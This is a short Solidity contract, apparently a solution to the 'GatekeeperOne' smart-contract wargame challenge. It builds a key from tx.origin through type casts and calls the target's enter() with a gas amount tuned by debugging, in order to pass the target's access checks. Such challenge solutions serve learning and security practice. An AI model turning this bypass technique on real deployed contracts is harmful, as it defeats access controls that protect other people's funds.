pragma solidity ^0.4.18;

interface GatekeeperOne{
    function enter(bytes8) public;
}

contract GatekeeperOneAttack {
    
    address public addr;
    
    function GatekeeperOneAttack(address _addr){
        addr = _addr;
    }
    
    function go() public {
        uint16 baseKey = uint16(tx.origin);
        uint64 incrKey = baseKey + 2**33;
        bytes8 gateKey = bytes8(incrKey);
        
        // Gas value has been calculated by debugging a failed attempt, read the compared value from the stack and adjust the gas accordingly
        GatekeeperOne(addr).enter.gas(49361)(gateKey);
    }
}